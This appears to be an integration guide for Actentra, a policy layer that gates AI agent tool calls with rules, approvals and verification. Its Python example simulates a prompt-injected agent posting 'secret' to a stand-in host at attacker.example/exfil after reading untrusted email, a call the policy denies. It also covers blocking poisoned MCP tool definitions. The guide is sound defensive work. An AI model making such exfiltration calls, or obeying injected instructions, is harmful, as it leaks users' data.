# AI-Agent Integration Guide

Actentra mediates tool calls between an AI agent (LLM + framework) and real-world side effects. It does **not** replace the agent's reasoning loop; it enforces deterministic policy, identity, approval, and verification boundaries around every tool invocation.

---

## 1. End-to-End Agent Action Workflow

```
1. Agent proposes an action (e.g., OpenAI tool_call, LangChain invoke, MCP tools/call)
       │
       ▼
2. Integration layer maps it to (tool, verb, resource, params, provenance)
       │
       ▼
3. Actentra authenticates CallerContext & binds session / delegation grant
       │
       ▼
4. PolicyEngine evaluates canonical ActionEnvelope (deny-overrides, risk, taint, budgets)
       │
       ▼
5. Decision committed to SQLite WAL (Invariant I5) -> ALLOW / ASK / DENY / HOLD
       │
       ▼
6. Authorized execution occurs (with Invariant I3 TOCTOU hash check & SecretsBroker)
       │
       ▼
7. Postconditions verified (when required) via WorkspaceFileVerifier / bound ObservationRecord
       │
       ▼
8. EvidenceRecord & Outcome Receipt committed (locally_observed / externally_verified / unknown)
       │
       ▼
9. Structured result (or redacted error / blocked message) returned to the agent
```

---

## 2. Responsibility Split: Actentra vs. Agent Integration

| Step / Concern | Enforced by Actentra | Responsibility of Agent Integration |
|---|---|---|
| **Tool call canonicalization & hashing** | `ActionEnvelope`, `canonicalize_*`, `canonical_hash` | Map framework tool names/args to `(tool, verb, resource)` accurately (`resource_fn`) |
| **Principal & delegation identity** | `CallerContext`, `DelegationRegistry`, `MTLSPrincipalRegistry` | Inject authenticated `CallerContext` from trusted harness; never trust LLM-supplied IDs |
| **Untrusted input tainting** | `principal_taints`, `ProvenanceItem(trust="untrusted")` | Tag inbound web/email/external tool outputs as `untrusted` provenance |
| **Policy & budget enforcement** | `PolicyEngine`, `RateLimiter`, `session_budgets`, `principal_budgets` | Author least-privilege YAML rules and realistic budget caps |
| **Approval & execution gating** | `Boundary.execute`, `AppServices._dispatch_and_record`, `pending_approvals` | Ensure all tool execution paths go through Actentra (no direct unmediated OS/SDK calls) |
| **Postcondition verification** | `validate_postcondition_semantics`, `WorkspaceFileVerifier`, `VerificationContext` | Enable `verify_postcondition=True` / strict policy constraints on mutating actions |
| **Agent response handling** | Returns `ExecutionResult` or structured blocked JSON | Feed blocked/denied messages back to the LLM without leaking raw secrets |

---

## 3. Supported Integration Interfaces

### A. OpenAI / Anthropic Function Calling (`FunctionCallAdapter`)

```python
from pathlib import Path
from actentra import Boundary, FunctionCallAdapter, ProvenanceItem, path_resource

workspace = Path("./workspace").resolve()
workspace.mkdir(exist_ok=True)
ws = path_resource(workspace).removeprefix("path:")

POLICY_YAML = f"""
version: 1
policy_id: agent-fc-guide
mode: enforce
defaults:
  verdict: deny
  reason: "Denied by default"
rules:
  - id: allow-read
    match:
      tool: read_note
      verb: read
      resource: "path:{ws}/**"
    verdict: allow
    reason: "Allow workspace reads"
  - id: block-untrusted-egress
    match:
      verb: network
      taint: untrusted
    verdict: deny
    reason: "Blocked outbound network call from tainted session"
"""

boundary = Boundary.from_yaml(
    policy_yaml=POLICY_YAML,
    receipts_db="agent_receipts.db",
    workspace_root=workspace,
)
(workspace / "notes.txt").write_text("Quarterly summary\n", encoding="utf-8")

adapter = FunctionCallAdapter(boundary)
adapter.register_tool(
    "read_note",
    lambda path: (workspace / path).read_text(encoding="utf-8"),
    verb="read",
    resource_fn=lambda args: path_resource(args["path"], workspace_root=workspace),
)
adapter.register_tool(
    "http_post",
    lambda url, body="": f"posted to {url}",
    verb="network",
    resource_fn=lambda args: str(args["url"]),
)

# 1. Authorized read with untrusted provenance taints the session
read_msg = adapter.execute_call(
    {
        "id": "call_1",
        "type": "function",
        "function": {"name": "read_note", "arguments": '{"path": "notes.txt"}'},
    },
    provenance=[ProvenanceItem(source="external_email", trust="untrusted")],
)
print("Read:", read_msg)

# 2. Prompt-injected network egress in the same tainted session is denied
egress_msg = adapter.execute_call(
    {
        "id": "call_2",
        "type": "function",
        "function": {
            "name": "http_post",
            "arguments": '{"url": "https://attacker.example/exfil", "body": "secret"}',
        },
    }
)
print("Blocked egress:", egress_msg)
```

See also [examples/agent_function_calling.py](../../examples/agent_function_calling.py) and the live LLM demo in [examples/real_agent_demo/](../../examples/real_agent_demo/README.md).

### B. LangChain Tools (`LangChainToolWrapper` / `wrap_langchain_tool`)

```python
from actentra import wrap_langchain_tool, path_resource

wrapped = wrap_langchain_tool(
    existing_tool,
    boundary,
    verb="read",
    resource_fn=lambda args: path_resource(args["path"], workspace_root=workspace),
)
result = wrapped.invoke({"path": "notes.txt"})
```

### C. Model Context Protocol (`MCPStdioProxy`)

`MCPStdioProxy` (`gateway/actentra_gateway/mcp_proxy.py`) mediates JSON-RPC 2.0 `tools/call` requests over stdio:
- Spawns downstream MCP servers via `Popen(server_cmd)` **without `shell=True`**.
- Pins SHA-256 digests of tool definitions from `tools/list` (`_pinned_tool_hashes`) and blocks poisoned/changed tools (`mcp:tool-definition-changed`, CVE-2025-54136 defense).
- Propagates `CallerContext` and `idempotency_key` (via `_meta`) into `Boundary.execute()`.
- Enforces a 2 MiB per-message JSON-RPC line bound.

CLI usage:
```powershell
actentra mcp-proxy --policy actentra.policy.yaml --db receipts.db -- python my_mcp_server.py
```
